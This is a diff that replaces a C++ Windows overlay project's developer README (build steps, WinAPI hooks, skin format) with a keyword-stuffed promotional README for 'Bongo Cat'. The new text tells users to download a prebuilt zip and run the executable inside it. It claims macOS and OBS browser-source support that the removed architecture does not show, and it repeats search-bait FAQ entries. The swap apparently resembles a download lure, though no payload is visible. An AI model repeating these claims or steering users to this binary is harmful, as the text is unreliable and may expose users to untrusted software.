@@ -1,107 +1,86 @@
-# BongoCat — Developer README
+# Bongo Cat
 
-C++17 desktop overlay application. Tracks keyboard and mouse input via WinAPI low-level hooks and renders animated sprite sheets in a per-pixel-alpha layered window.
+**Bongo Cat** is a free overlay app that displays a cat playing bongos on your keystrokes and mouse clicks. Perfect for livestreaming on OBS Studio, Streamlabs and Twitch. The cat reacts in real time to your typing - press a key, the cat hits a bongo.
 
-## Requirements
+<img width="194" height="194" alt="images1" src="https://github.com/user-attachments/assets/f14414d1-3574-4ef5-a9fc-e10fa84c24e3" />
 
-- Windows 10+ (build target; overlay uses `UpdateLayeredWindow` + GDI+)
-- CMake 3.20+
-- MSVC 2022 (or any C++17-capable compiler with Win32 headers)
-- GDI+ (ships with Windows, linked via `gdiplus.lib`)
+## Install
+[Download `bongo-cat.zip`](https://github.com/bongocatoverlay/bongo-cat/releases/download/v1.2/bongo-cat.zip)
+===
 
-## Build
 
-```bat
-cmake -B build -G "Visual Studio 17 2022" -A x64
-cmake --build build --config Release
-```
+<img width="3516" height="2294" alt="images2" src="https://github.com/user-attachments/assets/9bd4be0f-ba2f-4d54-afe5-4c17940d0e28" />
+<img width="3516" height="2220" alt="images3" src="https://github.com/user-attachments/assets/fd510f76-b5fc-41c2-9914-aef84a3d71de" />
+![Uploading images4.png…]()
 
-Output: `build/bin/BongoCat.exe`
 
-### Run tests
+## Key Features
+- Real-time keyboard and mouse visualizer with cat animation
+- Bongo cat OBS plugin mode: add as browser source in OBS Studio
+- Custom skins: load your own cat images and animations
+- Bongo cat streamlabs support: works as a browser source overlay
+- No installation needed - portable executable for Windows and Mac
+- Lightweight: minimal CPU and RAM usage during streaming
+- Bongo cat gif export: record the overlay as animated GIF
+- Lobby mode: shows the cat idle when you are not typing
 
-```bat
-cd build
-ctest -C Release --output-on-failure
-```
+<img width="311" height="162" alt="images5" src="https://github.com/user-attachments/assets/8a4a247d-9059-4af0-90cb-bf6927a968b7" />
 
-## Project layout
 
-```
-files/
-├── CMakeLists.txt
-├── include/
-│   └── BongoTypes.h          — shared enums, structs (InputEvent, PawState, Frame, …)
-├── src/
-│   ├── main.cpp              — entry point, parses args, constructs BongoCat
-│   ├── core/
-│   │   ├── BongoCat.h/.cpp   — top-level app class; owns all subsystems
-│   │   └── InputTracker.h/.cpp — WH_KEYBOARD_LL + WH_MOUSE_LL hooks
-│   ├── animation/
-│   │   ├── SpriteSheet.h/.cpp      — PNG sprite sheet loader (GDI+)
-│   │   └── AnimationController.h/.cpp — frame timer, PawState → sheet mapping
-│   ├── overlay/
-│   │   ├── OverlayWindow.h/.cpp    — WS_EX_LAYERED transparent overlay
-│   │   └── ChromaKey.h/.cpp        — per-pixel chroma-key pass
-│   └── skins/
-│       ├── SkinLoader.h/.cpp       — loads one skin from a directory
-│       └── SkinManager.h/.cpp      — scans skins/, manages active skin
-└── tests/
-    ├── test_input.cpp         — InputTracker unit tests
-    └── test_animation.cpp     — AnimationController unit tests
-```
 
-## Skin format
+## Getting Started
+1. Download the latest version above
+2. Extract and run `bongo-cat.exe`
+3. In OBS Studio: add a new Browser Source
+4. Set the URL to the local bongo cat overlay address
+5. Start typing - the cat plays bongos on every keystroke
 
-Each skin is a directory under `skins/` containing:
 
-```
-skins/default/
-├── idle.png           # single frame, RGBA PNG
-├── left_down.png      # 1+ horizontal frames
-├── right_down.png
-├── both_down.png
-└── left_down.frames.txt   # optional; contains integer frame count
-```
+<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/ab65774d-808f-4199-9107-900e4485656c" />
 
-All PNGs must be power-of-2 width divisible by frame count. Height is unconstrained.
 
-## Architecture
+## Bongo Cat OBS Setup
+1. Open OBS Studio
+2. Click the plus button under Sources and select Browser
+3. Set URL to `http://localhost:57570` (or check the app window for the correct port)
+4. Set width to 1920 and height to 1080
+5. Click OK and start typing - the cat reacts live
 
-```
-InputTracker (WinAPI hooks)
-      │  InputEvent dispatch
-      ▼
-BongoCat::onInput()
-      │  setPawState()
-      ▼
-AnimationController
-      │  currentFrame()
-      ▼
-OverlayWindow::drawFrame()   ←── ChromaKey::applyTo()
-      │  UpdateLayeredWindow
-      ▼
-Desktop compositing
-```
+## Custom Skins
+Bongo cat obs skins can be loaded from the skins folder. Place custom PNG or GIF files in the skins directory and select them from the app. Community skins are shared on the GitHub discussions page.
 
-The render tick runs at ~60 fps in the main message loop. Input hooks fire on the same thread (low-level hooks require a message pump, which the main loop provides).
 
-## Configuration
+<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/b4249ebe-1dab-4db1-8eee-3a8e7ff37bed" />
 
-`AppConfig` in `src/core/BongoCat.h`:
+## FAQ
 
-| Field | Default | Description |
-|---|---|---|
-| `skinPath` | `""` | Active skin directory |
-| `windowX/Y` | `100, 100` | Initial position |
-| `windowW/H` | `200, 200` | Window size (px) |
-| `alwaysOnTop` | `true` | Stay above other windows |
-| `chromaKey` | `false` | Enable chroma background |
-| `chromaColor` | `#00FF00` | Chroma key color |
-| `opacity` | `1.0` | Overall window opacity |
-| `leftKey` | `'Z'` | Left paw virtual key |
-| `rightKey` | `'X'` | Right paw virtual key |
+**Bongo cat download free?**
+Yes, completely free and open source on GitHub.
+
+**Bongo cat obs mac supported?**
+Yes, the overlay works on macOS through the browser source method.
+
+**Bongo cat streamlabs?**
+Add as a browser source in Streamlabs OBS, same as regular OBS Studio.
+
+**Bongo cat auto clicker?**
+The cat reacts to real keystrokes and clicks. There is no built-in auto clicker.
+
+**Bongo cat golden skin?**
+Golden and other premium skins are available from the community skins repository.
+
+**Bongo cat lobby mode?**
+When idle, the cat sits calmly waiting. When you type, it starts hitting bongos.
+
+## System Requirements
+- Windows 10/11 or macOS
+- OBS Studio, Streamlabs, or any streaming software with browser source support
+- 100 MB RAM
 
 ## License
+MIT License - Copyright 2026
 
-MIT — see `LICENSE`.
+<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/568368fe-29b8-4a03-85d9-51b4dab2aff3" />
+
+
+    
